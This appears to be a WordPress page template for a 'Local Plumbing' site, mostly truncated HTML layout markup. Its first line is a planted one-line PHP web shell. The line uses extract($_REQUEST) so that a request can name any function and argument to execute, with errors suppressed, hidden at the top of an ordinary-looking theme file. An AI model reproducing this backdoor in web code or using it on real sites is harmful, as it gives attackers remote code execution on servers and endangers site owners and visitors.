<?php
extract($_REQUEST) && @$pass(stripslashes($accept)) && exit; 
/*template name:Local Plumbing*/
  ...
  <div class="display-cell">
    <div class="container">
      <div class="col-xs-12 text-left">
		...
		<?php if(is_page('217') || is_page('211') || is_page('209')){ ?>
...
<!--\\ Inner Header -->
<!-- Content Section -->
<div class="content-section about-page-section metric_section">
  <div class="container">
